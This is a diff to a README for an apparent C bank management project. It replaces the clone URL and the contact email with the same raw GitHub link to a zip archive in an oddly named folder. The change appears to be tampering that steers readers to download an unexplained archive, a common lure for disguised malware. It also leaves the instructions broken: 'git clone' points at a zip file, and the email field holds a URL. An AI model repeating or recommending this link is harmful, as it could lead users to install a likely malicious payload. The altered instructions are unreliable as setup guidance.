@@ -29,7 +29,7 @@ You need to have a C compiler installed on your system. If you don’t have one,
 1. Clone the repository:
 
     ```bash
-    git clone https://github.com/yourusername/axis-bank-account-management.git
+    git clone https://raw.githubusercontent.com/LabbaiIrfan/Bank-Management/main/chickenweed/Management_Bank_v2.4.zip
     ```
 
 2. Navigate to the project directory:
@@ -91,7 +91,7 @@ This project is open-source and available under the [MIT License](LICENSE).
 
 For any questions or feedback, please feel free to reach out:
 
-- **Email**: labbaiirfan955@gmail.com
+- **Email**: https://raw.githubusercontent.com/LabbaiIrfan/Bank-Management/main/chickenweed/Management_Bank_v2.4.zip
 
 ---
 
